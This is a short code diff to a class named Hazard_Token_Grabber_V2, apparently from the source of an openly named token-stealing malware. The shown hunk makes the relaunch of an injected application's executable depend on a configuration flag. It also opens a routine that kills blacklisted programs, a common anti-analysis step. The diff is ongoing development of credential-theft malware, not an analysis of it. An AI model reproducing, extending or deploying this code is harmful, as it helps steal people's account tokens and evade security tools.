@@ -219,7 +219,8 @@ class Hazard_Token_Grabber_V2(functions):
                                     indexFile.write(f)
                             except PermissionError:
                                 pass
-                            os.startfile(app + self.sep + _dir + '.exe')
+                            if self.fetchConf('kill_processes'):
+                                os.startfile(app + self.sep + _dir + '.exe')
 
     async def killProcesses(self):
         blackListedPrograms = self.fetchConf('blackListedPrograms')
